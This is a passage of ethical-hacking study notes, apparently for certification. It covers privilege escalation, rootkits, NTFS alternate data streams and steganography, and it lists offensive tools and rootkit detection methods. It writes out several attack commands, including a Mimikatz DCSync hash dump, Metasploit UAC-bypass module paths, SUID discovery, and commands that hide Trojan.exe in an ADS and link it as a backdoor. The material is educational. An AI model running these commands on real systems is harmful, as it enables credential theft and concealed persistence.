				- Identify the offset: Attackers use Metasploit's pattern_create and pattern_offset tools to identify the offset and exact location where the EIP register is being overwritten
				- Overwrite the EIP register: Overwriting the EIP identifies whether a register can be controlled and overwritten with malicious shellcode
				- Identify bad characters: Before injecting the shellcode into the EIP register, attackers identify bad characters that may cause issues in the shellcode
				- Identify the right module: Identify the right module of a vulnerable server that lacks memory protection
				- Generate shellcode: Generate the shellcode (with the msfvenom command) and inject it into the EIP register to gain shell access to the target vulnerable server
				- Gain root access

## Privilege Escalation

- Types of Privilege Escalation
	- Horizontal Privilege Escalation (Same Level Privileges)
	- Vertical Privilege Escalation (Elevation of Privileges)
- Methods of Privilege Escalation
	- Privilege Escalation by Exploiting Vulnerabilities
	- Privilege Escalation Using DLL (Dynamic Link Library) Hijacking - Windows:
		- Spartacus : An automated DLL/COM hijacking toolkit that analyzes SysInternals Process Monitor logs to identify, exploit, and generate payloads for DLL and COM hijacking vulnerabilities
		- DLLirant : Tool to automatize the DLL Hijacking and DLL Proxying researches on a specified binary 
		- ImpulsiveDLLHijack : Automates the discovery and exploitation of DLL hijacking vulnerabilities in target binaries, with the hijacked paths identified later being weaponized during Red Team operations to evade EDR systems
		- PowerSploit : PowerShell Post-Exploitation Framework that is a collection of Microsoft PowerShell modules that aid penetration testers during all phases of an assessment
	- Privilege Escalation Using Dylib (dynamic library) Hijacking - MacOS:
		- Dylib Hijack Scanner : Scans a computer for applications that are either susceptible to dylib hijacking or have already been hijacked
	- Privilege Escalation Using Spectre and Meltdown Vulnerabilities:
		- Spectre and Meltdown are vulnerabilities found in the design of modern processor chips (AMD, ARM, and Intel). These vulnerabilities arise from performance and CPU optimizations in processors, such as branch prediction, out-of-order execution, caching, and speculative execution. Attackers can exploit these vulnerabilities to gain unauthorized access and steal sensitive system information, such as credentials and secret keys stored in the application's memory, to escalate privileges.
		- Spectre Vulnerability: Attackers can exploit this vulnerability to read adjacent memory locations of a process, accessing unauthorized information, and may even gain access to kernel memory or perform web-based attacks using JavaScript.
		- Meltdown Vulnerability: Attackers can exploit this vulnerability to escalate privileges by forcing an unprivileged process to read adjacent memory locations, such as kernel and physical memory, thereby revealing critical system information like credentials and private keys.
	- Privilege Escalation Using Named Pipe Impersonation - Windows:
		- In Windows OS, named pipes are used to facilitate legitimate communication between running processes.
		- In this technique, messages are exchanged between processes using a file. For example, if process A wants to send a message to process B, it writes the message to a file, and process B reads the message from that file.
	- Privilege Escalation by Exploiting Misconfigured Services - Windows:
		- Unquoted Service Paths: In Windows, services with unquoted executable paths can be exploited by attackers to elevate privileges when running under SYSTEM privileges.
		- Service Object Permissions: Misconfigured service permissions can allow attackers to modify or reconfigure service attributes, add users to the administrator group, and elevate privileges.
		- Unattended Installs: Unattended installation information, such as configuration settings used during the installation process, is stored in the Unattend.xml file and can be exploited by attackers to escalate privileges.
		- Modifiable Registry Autoruns and Configurations: Modifying certain registry entries that control the execution of programs, often exploiting weak or misconfigured permissions to gain higher privileges, execute malicious code, or persist on the system.
	- Pivoting and Relaying to Hack External Machines:
		- Pivoting and relaying are techniques used to gather detailed information about a target network after successfully compromising a target system. The compromised system acts as a bridge, enabling attackers to penetrate deeper into the target network and access other systems and resources that would otherwise be inaccessible from the attacking system.
		- Pivoting: Attackers use the pivoting technique to compromise a system, gain remote shell access on it, and further bypass the firewall to pivot via the compromised system to access other vulnerable systems in the network.
		- Relaying: Attackers use the relaying technique to access resources present on other systems via the compromised system in such a way that the requests to access the resources are coming from the initially compromised system.
	- Privilege Escalation Using Misconfigured NFS - Windows:
		- Attackers attempt to enumerate a misconfigured Network File System (NFS) to exploit it and gain root-level access to a remote server, as such misconfigurations allow them to escalate privileges from a regular or low-privileged user account.
	- Privilege Escalation by Bypassing User Account Control (UAC):
		- When attackers fail to escalate privileges with a simple payload, they attempt to evade Windows security features like UAC and exploit certain Windows applications to gain system-level access without triggering a UAC notification, even when UAC protection is enabled.
		- Techniques to Bypassing UAC Protection Using Metasploit:
			- Bypassing UAC Protection - exploit/windows/local/bypassuac
			- Through FodHelper Registry Key - exploit/windows/local/bypassuac_fodhelper
			- Through Eventvwr Registry Key - exploit/windows/local/bypassuac_eventvwr
			- Through COM Handler Hijacking - exploit/windows/local/bypassuac_comhijack
			- Via Memory Injection - exploit/windows/local/bypassuac_injection
	- Privilege Escalation by Abusing Boot or Logon Initialization Scripts:
		- Attackers exploit boot or logon initialization scripts to escalate privileges or maintain persistence on a target system. These scripts also enable attackers to perform various administrative tasks, allowing them to execute other programs on the system.
		- Windows Logon Script : Attackers establish persistence and escalate privileges on a system by embedding the path to their script in the registry key (HKEY_CURRENT_USER\Environment\UserInitMprLogonScript)
		- Mac Logon Script : In macOS, logon scripts are known as login hooks and allow attackers to establish persistence on a system, as they are executed automatically during system login. Attackers exploit these hooks to inject a malicious payload, elevate privileges, and maintain persistence.
		- Network Logon Scripts : Network logon scripts are assigned through Active Directory or GPOs. Attackers exploit these scripts to obtain local or administrator credentials, depending on the access configuration.
		- RC Scripts : Attackers exploit RC scripts by embedding a malicious binary, shell, or path in RC scripts such as rc.common or rc.local on Unix-based systems to escalate privileges and maintain persistence.
		- Startup Items : Attackers create malicious files or folders within the /Library/StartupItems directory to maintain persistence. Startup items are executed during bootup with root-level privileges.
	- Privilege Escalation by Modifying Domain Policy:
		- The domain policy consists of configuration settings that can be applied between domains in a forest environment. Attackers modify domain settings by altering group policies and trust relationships between domains. They may also deploy a fake domain controller to maintain a foothold and escalate privileges.
		- Group Policy Modification:
			- Group policies manage resources and configuration settings such as security options, registry keys, and domain members. By default, all user accounts have read access to GPOs, while write access is restricted to specific users or groups within the domain.
			- Attackers exploit the path <DOMAIN>\SYSVOL\<DOMAIN>\Policies\ to access and modify domain group policies, enabling activities like creating new accounts, disabling or modifying internal tools, transferring ingress tools, executing unwanted services, and extracting passwords in plaintext.
			- At <GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml, attackers can modify the file to create a malicious scheduled task or job using scripts like New-GPOImmediateTask.
			- At <GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf, attackers may alter user rights (e.g., SeEnableDelegationPrivilege) to create a backdoor and then control the user account to modify group policy settings.
		- Domain Trust Modification:
			- Domain trust objects provide information such as credentials, accounts, and authentication and authorization mechanisms used by domains. C:\Windows\system32>nltest /domain_trusts
			- Attackers use this utility to gather information about trusted domains and leverage it to add a domain trust or modify existing trust settings, enabling privilege escalation through Kerberoasting and pass-the-ticket attacks.
	- Retrieving Password Hashes of Other Domain Controllers Using DCSync Attack:
		- A domain controller (DC) in a Windows environment securely validates user requests, manages user accounts, provides authentication, and enforces domain security policies. Directory replication ensures data consistency across DCs, so updates like password changes are reflected across all controllers.
		- The DCSync attack targets selective DCs. Attackers with privileged access and domain replication rights use replication protocols to create a virtual DC. This allows them to request and extract sensitive data, such as NTLM password hashes. With this information, attackers can perform golden ticket attacks, account manipulation, LOTL attacks, and deploy ransomware.
		- Attackers use Mimikatz to perform DCSync attacks. Mimikatz includes a DCSync command that employs the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to mimic the behavior of a legitimate domain controller (DC).
		- Retrieve the NTLM password hashes of an administrator account: mimikatz “lsadump::dcsync /domain:(domain name) /user:Administrator”
	- Privilege Escalation by Abusing Active Directory Certificate Services (ADCS):
		- Active Directory Certificate Services (ADCS) is commonly deployed across the AD environment to manage certificates for applications, users, systems, and other entities within the network.
		- Misconfigured ADCS templates can create critical vulnerabilities that attackers can exploit for malicious activities, such as stealing credentials, escalating privileges, and establishing persistence.
		- Attackers can use tools like Certipy to identify and exploit misconfigured ADCS templates.
		- Certipy : Certipy is an offensive tool used for enumerating and exploiting Active Directory Certificate Services (ADCS).
	- Other Privilege Escalation Techniques:
		- Access Token Manipulation:
			- In Windows operating systems, access tokens determine the security context of a process or thread, including the user's identity and privileges. After a user is authenticated, the system generates an access token, which is used by every process the user executes. The system verifies the access token when a process accesses a secured object.
			- Any Windows user can modify these access tokens, making the process appear to belong to a different user than the one who started it, thus adopting the new token's security context. For example, administrators typically log in as normal users and use the "runas" command to execute tools with elevated privileges. Attackers can exploit this to access other users' tokens or generate spoofed tokens, escalating privileges and performing malicious actions while evading detection.
		- Parent PID Spoofing:
			- Attackers attempt to bypass internal security mechanisms and escalate privileges by spoofing the parent process ID (PPID) of a newly created process. New processes typically inherit their PPID from their parent unless explicitly specified. This can be done by providing a PPID for the new process via the CreateProcess API. The API call includes specific arguments that determine which PPID to use.
			- The PPID can be set to that of system processes like svchost.exe or consent.exe, which are associated with Windows User Account Control (UAC). Attackers exploit these methods to bypass security restrictions on process spawning, evade tools that analyze parent-child relationships, and maintain persistence for privilege escalation.
		- Application Shimming:
			- Windows operating systems use the Windows Application Compatibility Framework, which includes "shims," to ensure compatibility between older and newer versions. For example, shimming allows programs designed for Windows XP to run on Windows 11. Shims act as a buffer between the program and the OS, checking if the program requires access to the shim database and using API hooking to redirect code for compatibility.
			- Shims installed by the default Windows installer (sbinst.exe) are stored at %WINDIR%\AppPatch\sysmain.sdb and in the registry at HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB. Running in user mode, shims can't modify the kernel but can be exploited to bypass UAC, inject malicious DLLs, capture memory addresses, etc. Attackers use these to disable Windows Defender, escalate privileges, install backdoors, and perform other malicious activities.
		- Filesystem Permission Weakness:
			- Many processes in Windows operating systems automatically execute binaries as part of their functionality or to perform specific actions. If the filesystem permissions for these binaries are misconfigured, an attacker can replace the legitimate binary with a malicious one, and the process will execute it.
			- If the process running the binary has elevated permissions, the malicious binary will also execute with those higher privileges, potentially including SYSTEM privileges. Attackers exploit this vulnerability to replace legitimate binaries with malicious ones, enabling privilege escalation. This technique is often used to manipulate Windows service binaries and self-extracting installers.
		- Path Interception:
			- Path interception is a technique where an attacker places a malicious executable in a specific path, causing the application to execute it instead of the legitimate target. Attackers can exploit various flaws or misconfigurations to perform path interception, such as unquoted paths (e.g., service paths and shortcut paths), misconfigured path environment variables, and search order hijacking.
		- Abusing Accessibility Features:
			- Attackers can establish persistence and escalate privileges by embedding and executing malicious code within Windows accessibility features. These features can be activated using key combinations even before a user logs into the system, allowing attackers to manipulate them and gain backdoor access without needing to log in.
			- In a Windows environment, these programs are typically stored in C:\Windows\System32\ and can be triggered by pressing specific keys during system reboot. Attackers can escalate privileges by replacing one of the accessibility features with cmd.exe or by modifying registry entries to launch malicious binaries when the key combination is pressed at the login screen. This technique enables attackers to gain system-level access.
			- Accessibility features abused by attackers:
				- On-screen keyboard: C:\Windows\System32\osk.exe
				- Magnifier: C:\Windows\System32\Magnify.exe
				- Narrator: C:\Windows\System32\Narrator.exe
				- Display switcher: C:\Windows\System32\DisplaySwitch.exe
				- App switcher: C:\Windows\System32\AtBroker.exe
				- Sticky keys: C:\Windows\System32\sethc.exe
		- SID-History Injection:
			- In Windows, a Security Identifier (SID) is a unique value assigned to each user and group account by the domain controller (DC) at the time of creation. Active Directory (AD) accounts can store multiple SID values in the SID-history attribute, which is used when migrating a user from one domain to another.
			- Attackers exploit this feature by injecting the SID of an administrator or equivalent account with higher privileges into the compromised user account's SID-history attribute. This injection can elevate the user's privileges, allowing the attacker to access restricted resources or remote systems. Attackers can also move laterally within the domain by using further techniques, such as accessing remote services, SMB/Windows admin shares, or Windows Remote Management.
		- COM Hijacking:
			- The Component Object Model (COM) is an interface framework in Windows environments that allows one software component to interact with another without being aware of its actual implementation. Attackers exploit COM objects by hijacking valid references and replacing them with their own, allowing them to infect the target system and achieve persistence.
			- This process involves modifying or replacing object references with malicious content in the Windows Registry. When a user executes the commonly used object, the malicious code is automatically triggered, enabling the attacker to maintain persistence and potentially escalate privileges associated with the object.
			- COM hijacking techniques:
				- Exploiting the registry loading process by creating a malicious user object under the HKEY_CURRENT_USER\Software\Classes\CLSID\ registry key, which is loaded by the system before the HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\ registry key.
				- Interchanging legitimate DLLs or executable names with malicious payloads, causing the payloads to execute when the legitimate DLLs or executables are run.
				- Exploiting orphaned requests made by system components that are not yet defined in the registry, creating malicious COM objects for those requests in the HKEY_CURRENT_USER registry and mapping them to malicious payloads hidden in the file system.
		- Scheduled Tasks in Windows:
			- Scheduled tasks allow users to automate routine tasks on a computer. Windows includes utilities such as at and schtasks. A user with administrator privileges can use these utilities, along with Task Scheduler, to schedule programs or scripts to run at specific dates and times. If the user provides proper authentication, they can also schedule tasks remotely using Remote Procedure Call (RPC).
			- Attackers can exploit this technique to execute malicious programs at system startup, maintain persistence, perform remote execution, escalate privileges, etc.
		- Scheduled Tasks in Linux:
			- Linux utilizes cron or crond, an instruction-based utility, for automating task scheduling. Attackers exploit this utility to trigger malicious payloads when a specific task is scheduled for execution. The scheduler allows users with administrator privileges to configure cron jobs and execute them at specified times. cron runs commands from the crontab file, typically located at /etc/crontab.
			- Attackers can escalate privileges by modifying scripts executed by cron in /etc/crontab. By altering these scripts, attackers can ensure malicious code is executed automatically during system reboot, potentially gaining root privileges.
		- Launch Daemon:
			- During the macOS boot process, launchd is executed to complete the system initialization. It loads parameters for each launch-on-demand system-level daemon found in /System/Library/LaunchDaemons and /Library/LaunchDaemons. These daemons have associated property list files (plists), which are linked to executables that run during boot.
			- Attackers can create and install a new launch daemon configured to execute at boot time by using launchd or launchctl to load plists into the appropriate directories. Weak configurations may allow attackers to alter the executable of an existing launch daemon, enabling them to maintain persistence or escalate privileges.
		- Plist Modification:
			- In macOS, plist (property list) files contain all the necessary information to configure applications and services. These files specify when programs should execute, the executable file path, program parameters, essential OS permissions, etc. Plist files are stored in specific locations, such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with user-level privileges).
			- Attackers can access and modify these plist files to execute malicious code on behalf of a legitimate user, using them as a persistence mechanism and to escalate privileges.
		- Setuid and Setgid:
			- In Linux and macOS, when an application uses the setuid or setgid flags, the application executes with the privileges of the owning user or group, respectively. Normally, applications run under the current user’s privileges. However, there are situations where programs need to be executed with elevated privileges, even though the user running the program does not require them.
			- In such cases, the setuid or setgid flags can be set for the application. An attacker can exploit applications with the setuid or setgid flags to execute malicious code with elevated privileges.
		- Web Shell:
			- A web shell is a web-based script that provides access to a web server. Web shells can be created on various operating systems, including Windows, Linux, and macOS. Attackers use web shells to inject malicious scripts onto a web server, enabling them to maintain persistent access and escalate privileges. A web shell acts as a backdoor, allowing attackers to gain access and control over a remote server.
			- Typically, a web shell runs under the current user’s privileges. Using a web shell, an attacker can escalate privileges by exploiting local system vulnerabilities. Once privileges are escalated, the attacker can install malicious software, modify user permissions, add or remove users, steal credentials, read emails, etc.
		- Abusing Sudo Rights:
			- Sudo (substitute user do) is a UNIX and Linux-based system utility that allows users to run commands as a superuser or root, using the security privileges of another user. The /etc/sudoers file contains the configuration for sudo rights, detailing access permissions, including which commands can be run with or without a password, for each user or group.
			- Attackers can exploit sudo to escalate their privileges and run programs that normal users are not authorized to execute. For example, if an attacker has sudo rights to run the cp command, they could overwrite the /etc/sudoers or /etc/shadow files with their own malicious files. By modifying the content of the sudoers file, the attacker could alter permissions to run restricted commands or programs, enabling further attacks on the system.
		- Abusing SUID and SGID Permissions:
			- Set User Identification (SUID) and Set Group Identification (SGID) are access permissions assigned to program files in UNIX-based systems. These permissions allow users to execute a program with temporarily elevated or root privileges in order to perform a specific task. Files with SUID and SGID rights run with higher privileges than those of the user running the program.
			- In Linux, certain commands and binaries can be exploited by attackers to escalate their privileges from non-root users to root, if the SUID and SGID flags are set. Some of the executable commands that attackers can use to spawn a shell and escalate privileges include nmap, vim, less, more, bash, cat, cp, echo, find, nano, and others.
			- Find SUID and SGID files in the target system:
				- Find SUID: find / -perm -u=s -type f 2>/dev/null
				- Find GUID: find / -perm -g=s -type f 2>/dev/null
		- Kernel Exploits:
			- Kernel exploits refer to programs that take advantage of vulnerabilities in the kernel to execute arbitrary commands or code with elevated privileges. By successfully exploiting these kernel vulnerabilities, attackers can gain superuser or root-level access to the target system. To execute a kernel exploit, attackers typically need specific configuration details of the target system.
			- OS, kernel version, and architecture of the target system:
				- OS: cat /etc/issue
				- Kernel version: uname -a
				- Architecture: cat /proc/version
			- Detect kernel exploits for escalating privileges: www.exploit-db.com -> linprivchecker.py
		- Abusing '.' in the Path:
			- Adding . to the PATH allows users to execute binaries or scripts from the current directory. While convenient, this practice poses a security risk. If an attacker gains access to a system where a privileged user runs scripts from various directories, they can manipulate the PATH to include a malicious directory.
			- For example, by placing a malicious script named ls in the attacker-controlled directory, the system will execute it instead of the legitimate ls command. This enables the attacker to run arbitrary commands, potentially escalating privileges if the user has elevated permissions.
		- Abusing Elevation Control Mechanism on macOS:
			- Attackers may exploit the AuthorizationExecuteWithPrivileges API for privilege escalation. This API is designed to allow developers to perform operations requiring root privileges, such as software installation or updates. However, it lacks proper validation to verify whether root access requests come from a trusted source.
			- Attackers can exploit this vulnerability to gain root privileges, enabling them to install malicious software and establish persistence on victim systems. When this API is invoked, the user is prompted for their credentials without any verification of the program’s source or integrity. Additionally, the program using the API may load world-writable files, which can be modified by attackers to execute malicious actions with elevated privileges.
		- Process Injection via Ptrace System Calls:
			- Attackers may exploit the ptrace (process trace) system call to inject malicious code into running processes, allowing them to evade process-based defenses and potentially escalate privileges. The ptrace system call enables attackers to debug a process, monitoring and manipulating its memory and register values.
			- Typically, ptrace injection involves writing arbitrary code into a running process (e.g., using malloc) and then using PTRACE_SETREGS to set the register that contains the next instruction to execute. Alternatively, attackers can use PTRACE_POKETEXT or PTRACE_POKEDATA to copy data into specific addresses in the target process's memory, such as the address of the next instruction to execute.
		- Abusing Microsoft Software Installer (MSI):
			- In Windows, MSI files act as databases that contain the dependencies and instructions necessary for installing and removing software. They also allow developers to execute additional scripts during installation, removal, or repair through Custom Actions. During software installation, MSI files are stored in the C:\Windows\Installer directory with randomized names and a .msi extension.
			- This setup enables regular users to use the "repair" functionality to fix issues like missing files, broken shortcuts, invalid registry entries, and other malfunctions. When invoked, the "repair" process can trigger critical actions, including file creation and execution, under the NT AUTHORITY\SYSTEM account, even when initiated by a standard user.
			- If not properly managed, this can pose significant risks. Poorly configured Custom Actions running as NT AUTHORITY\SYSTEM can be exploited by attackers to elevate privileges. Misconfigurations may allow file operations in directories writable by standard users, enabling attackers to modify files used by NT AUTHORITY\SYSTEM and execute arbitrary code, ultimately escalating their privileges.
		- Abusing Windows Filtering Platform (WFP) - NoFilter Attack:
			- The NoFilter attack is a privilege escalation technique that exploits the Windows Filtering Platform (WFP) on Windows 11 systems to gain system-level privileges. This method allows attackers to infiltrate deep into the operating system, run malicious child processes, execute malware with NT AUTHORITY\SYSTEM privileges, or even impersonate other logged-in users to maintain persistence without detection.
			- In this attack, the attacker first identifies the BfeRpcOpenToken method in the WFP by invoking WinAPI through RPC mapping using tools like RPC Mapper. The attacker then exploits the WFP to retrieve a handle to the access token of another process with system-level privileges from the NT handle table. After obtaining the handle to the targeted access token, the attacker uses it to create a copy of the token.
			- Methods for duplicating the acquired access token without triggering detection:
				- Token duplication via WfpAle component : This involves calling the WfpAleProcessTokenReference method in Windows, which causes the TCP/IP driver to duplicate the token and store it in the hash table. The LUID returned by the driver can be used to retrieve the duplicated access token.
				- Token duplication via IPsec connection : This method involves manipulating a user service to create an IPsec connection with the TCP/IP driver, which then duplicates the token and stores it in the hash table. Since the LUID of the token is not returned in this process, the token can only be retrieved by brute-forcing the LUID, which ranges from 1 to 4096.
			- Once the token is duplicated, the attacker can escalate privileges and perform high-level operations on the system, including duplicating tokens from services like LSM, Schedule, and Winmgmt.

## Maintaining Access
Use Different Techniques to Conceal Malicious Programs and Maintain Remote Access to the System.

- Executing Applications
	- When attackers execute malicious applications remotely on a victim’s machine, it is referred to as "owning" the system, enabling them to gather information for exploitation or privacy breaches, gain unauthorized access to system resources, exfiltrate data, capture screenshots, and install backdoors for sustained access.
	- Malicious Programs Executed by Attackers on Target Systems:
		- Backdoors
		- Crackers
		- Keyloggers
		- Spyware
	- Remote Code Execution Techniques:
		- Exploitation for Client Execution:
			- Web-Browser-Based Exploitation
			- Office-Applications-Based Exploitation (MS Office, Email Applications)
			- Third-Party Applications-Based Exploitation (Adobe Reader, Flash, etc.)
		- Service Execution
			- System services are backend programs in an OS. Attackers exploit them by running binaries or commands that interact with tools like the Service Control Manager, creating or modifying services to escalate privileges or maintain access.
		- Windows Management Instrumentation (WMI)
			- WMI, a Windows feature, manages system resources locally and remotely. Attackers exploit it to access systems, gather data, and execute code to maintain access.
		- Windows Remote Management (WinRM)
			- WinRM is a Windows protocol that enables users to run executable files and modify system services or the registry on remote systems. Attackers exploit WinRM to execute payloads and facilitate lateral movement.

- Hiding Files
	- Rootkits
		- A rootkit is a stealthy malware program that enables attackers to gain and maintain unauthorized root-level access to a system while hiding their presence and malicious activities by modifying operating system components and utilities.
		- System hooking is the process of modifying and replacing the original function pointer with one provided by the rootkit in stealth mode. Inline function hooking is a technique in which a rootkit modifies some of the bytes of a function within core system DLLs (such as kernel32.dll and ntdll.dll), inserting an instruction so that any process calls are directed to the rootkit first.
		- Types of Rootkits:
			- Hypervisor-Level Rootkit : Hypervisor-level rootkits exploit hardware features like Intel VT and AMD-V to run in Ring-1, hosting the target OS as a virtual machine and intercepting all its hardware calls by altering the boot sequence to load themselves instead of the original virtual machine monitor.
			- Hardware/Firmware Rootkit : Hardware or firmware rootkits embed persistent malware in hardware components like the BIOS, hard drive, or network card, evading detection by hiding in firmware, which is rarely inspected for code integrity.
			- Kernel-Level Rootkit : A kernel-level rootkit operates in Ring-0 with the highest OS privileges, modifying kernel code or adding malicious code via device drivers (Windows) or loadable kernel modules (Linux). These rootkits are hard to detect, can destabilize the system if buggy, and can intercept or manipulate OS operations.
			- Boot-Loader-Level Rootkit : Boot-loader-level rootkits, or bootkits, operate by modifying or replacing the legitimate boot loader, allowing them to activate before the OS starts.
			- Application-Level/User-Mode Rootkit : An application-level/user-mode rootkit runs in Ring-3 alongside other applications, exploiting API behavior to replace standard application files (application binaries) or modify existing applications with patches or injected malicious code.
			- Library-Level Rootkits : Library-level rootkits operate high in the OS, patching, hooking, or replacing system calls with backdoor versions to conceal the attacker’s presence by hiding information.
			- Memory Rootkits : Memory rootkits, or volatile rootkits, are malware that reside solely in a system's RAM, leaving no traces on disk. Unlike traditional rootkits, they operate entirely in volatile memory, making them more elusive and harder to detect.
		- Rootkit Softwares:
			- FudModule Rootkit : The FudModule Rootkit exploits a zero-day admin-to-kernel vulnerability in the Windows AppLocker driver (appid.sys) and employs DKOM techniques to bypass various kernel security mechanisms, thereby gaining kernel-level access. (decoded.avast.io)
			- Fire Chili Rootkit : The Fire Chili rootkit is a sophisticated malware that exploits the Log4Shell vulnerability to enable espionage and data exfiltration. Operating at the kernel level, it allows attackers to intercept, modify, or hide system calls, processes, and network connections, providing long-term remote control and data theft capabilities. (www.fortinet.com)
			- CopperStealer : CopperStealer is a type of malware designed to steal sensitive information from infected systems, primarily focusing on credentials such as login details, cookies, and saved passwords from web browsers. The CopperStealer rootkit is a variant of the CopperStealer malware that incorporates rootkit functionalities.

			- Syslogk : The Syslogk rootkit is a sophisticated piece of malware targeting Linux systems, designed to operate covertly and evade detection. It installs itself as a kernel module, allowing it to intercept and manipulate system logs, effectively concealing its presence and activities. Syslogk enhances its stealth by removing its own entry from the list of installed kernel modules, making it challenging for system administrators to detect.
			- Adore-Ng Rootkit : The Adore-Ng rootkit is a Linux-based rootkit originally developed as an open-source tool to conceal the presence of malicious software and activities on a compromised system. It is an enhanced version of the Adore rootkit.

			- CosmicStrand : The CosmicStrand rootkit is a UEFI-based rootkit that infects a computer's firmware, giving attackers deep, persistent control over the system. It operates below the OS level, evading detection by security software and surviving OS reinstallation. This rootkit allows remote control, data theft, and the installation of additional malware, making it a significant security threat.
		- Rootkit Detection Techniques :
			- Integrity-Based Detection : Integrity-based detection serves as an alternative to both signature and heuristic-based detection. Tools like Tripwire and AIDE are initially run on a clean system to create a baseline of system files, which are stored in a database. The detection process compares the current filesystem, boot records, or memory snapshot with the trusted baseline, identifying malicious activity by detecting differences between the two.
			- Signature-Based Detection : Signature-based detection identifies rootkits by comparing system processes and files to a database of known rootkit fingerprints. It scans system files and kernel memory to detect malicious programs, including hidden rootkits. However, its effectiveness is limited, as rootkits often hide files or interrupt detection software’s execution path.
			- Heuristic/Behavior-Based Detection : Heuristic-based detection identifies rootkits by recognizing deviations in normal system behavior, also known as behavioral detection. It can detect new, unknown rootkits by spotting irregularities, such as execution path hooking, that differ from standard system patterns.
			- Runtime Execution Path Profiling : Runtime execution path profiling compares the execution paths of system processes and files. Rootkits destabilize routines by adding new code to the execution path. This method hooks instructions before and after routines, as they may differ significantly.
			- Cross-View-Based Detection : Cross-view-based detection assumes the OS has been subverted and enumerates system files, processes, and registry keys using common APIs. It compares this data with a dataset gathered through an algorithm that avoids manipulation. This method relies on the fact that API hooking or kernel manipulation taints the data returned by the OS, allowing for detection of tampered information.
			- Alternative Trusted Medium : The alternative trusted medium technique is a reliable method for detecting rootkits. It involves shutting down the infected system, booting from trusted media like a USB drive, and scanning the OS storage for rootkit traces, which can then be removed to restore the system.
			- Analyzing Memory Dumps : Memory dump analysis involves dumping and analyzing the system's volatile memory (RAM) to detect rootkits. It captures a snapshot of the entire system, process, or kernel, enabling offline forensic analysis. Specialized hardware may be needed to create the memory dump.
			- Virtualization-Based Analysis : Virtualization-based analysis uses introspection techniques to monitor guest operating systems for virtual rootkit activity. Security solutions run within the hypervisor to detect and mitigate virtual rootkits.

	- NTFS Data Stream
		- The NTFS filesystem stores files using two primary data streams: the first holds the security descriptor, such as file permissions, and the second contains the actual file data. Alternate Data Streams (ADS), a feature of NTFS, attach additional data to a file without altering its size, functionality, or visibility in file-browsing utilities. ADS stores metadata such as file attributes, timestamps, and word count and can also be used to embed additional data or malicious code. By forking data into existing files, ADS remains undetected in standard file inspection and provides attackers with a method to hide malicious code, rootkits, or hacker tools. This enables the execution of malicious content without detection by users or system administrators.
		- NTFS data streams allow attackers to hide files undetectable by standard file explorers or security software, as explorers only display root files and ignore linked streams. If a virus embeds itself in an ADS, it remains hidden, as users and default operations interact only with the main data stream.
		- Create NTFS Streams:
			- Open Notepad: notepad myfile.txt:lion.txt
			- Click ‘Yes’ to create the new file, enter some data, and save it
			- View the file size of myfile.txt—it should show as zero
			- The same command can be used to view or modify hidden stream data
		- NTFS Stream Manipulation:
			- Hiding Trojan.exe (Malicious Program) in Readme.txt (Stream):
				- Move the contents of Trojan.exe into an alternate data stream of Readme.txt:
					- c:\> type c:\Trojan.exe > c:\Readme.txt:Trojan.exe
					- The type command hides a file in an alternate data stream (ADS) associated with an existing file. The colon (:) operator is used to specify and create or access the ADS.
			- Creating a Link to the Trojan.exe Stream in the Readme.txt File:
				- After hiding the Trojan.exe file within the Readme.txt file's stream, create a symbolic link to launch Trojan.exe directly from the stream. This provides a shortcut to access the hidden stream.
					- C:\> mklink backdoor.exe Readme.txt:Trojan.exe

	- Steganography
		- Steganography is a technique for hiding a secret message within an ordinary message, such as embedding data in a graphic image, to maintain data confidentiality. It is commonly used by attackers to conceal sensitive information, including lists of compromised servers, source code for hacking tools, or plans for future attacks.
		- Steganography hides the existence of a message by replacing bits of unused data in ordinary files, such as graphics, sound, text, audio, or video, with hidden information. The concealed data can take the form of plaintext, ciphertext, or even another image.
		- Classification of Steganography:
			- Technical : Technical steganography employs physical or chemical methods, such as invisible ink, microdots, and computer-based techniques, to conceal the existence of a message. Examples include invisible ink, microdots, and computer-based methods.
				- Computer-based Steganography Techniques:
					- Substitution Techniques : In this technique, the attacker encodes secret information by replacing insignificant bits with the hidden message. If the receiver knows the locations where the secret information is embedded, they can extract the hidden message.
					- Transform Domain Techniques : The transform domain technique hides information in significant parts of the cover image, such as during cropping, compression, or other image processing operations, making it more resistant to attacks. Transformations can be applied either to specific blocks of the image or to the entire image.
					- Spread Spectrum Techniques : This technique is less susceptible to interception and jamming. It involves communication signals occupying more bandwidth than necessary to transmit the information. The sender increases the bandwidth using a code independent of the data, while the receiver employs synchronized reception with the same code to extract the information from the spread spectrum signal.
					- Statistical Techniques : This technique leverages “1-bit” steganography schemes by modifying the cover so that transmitting a “1” significantly alters certain statistical characteristics. When no transmission occurs, the cover remains unchanged, allowing differentiation between modified and unmodified covers. The extraction process relies on hypothesis testing from mathematical statistics.
					- Distortion Techniques : In this technique, the user applies a series of modifications to the cover to create a stego-object, with the modifications representing the transformation of a specific message. Decoding requires knowledge of the original cover, allowing the receiver to measure the differences between the original and the received cover to reconstruct the sequence of modifications.
					- Cover Generation Techniques : In this technique, digital objects are specifically designed to serve as covers for secret communication. The information is encoded in a way that ensures the creation of a suitable cover for concealing the secret message.
			- Linguistic : This type of steganography conceals a message within the carrier of another file, often utilizing text-based or language-driven methods.
				- Semagram : Semagrams are a steganography technique that conceals information using signs or symbols. In this method, the user embeds objects or symbols within the data, altering its appearance to convey a predetermined meaning.
					- Visual Semagram : This technique conceals information within drawings, paintings, letters, music notes, or symbols.
					- Text Semagram : A text semagram hides a message by altering the appearance of the carrier text, such as changing font sizes and styles, adding extra spaces or white spaces, and incorporating flourishes in letters or handwritten text.
				- Open Codes : Open code conceals a secret message within a legitimate carrier message, designed in a pattern that is unclear to the average reader. The carrier message, also known as overt communication, hides the secret message, referred to as covert communication.
					- Covered Ciphers : This technique conceals the message within a carrier medium that is visible to everyone. The hidden message can be extracted by anyone who knows the method used to embed it.
						- Null Cipher : This technique hides a message within a large amount of irrelevant data. The original message is mixed with the unused data in a specific order—horizontally, diagonally, vertically, or in reverse—making it unintelligible to anyone who does not know the correct order.
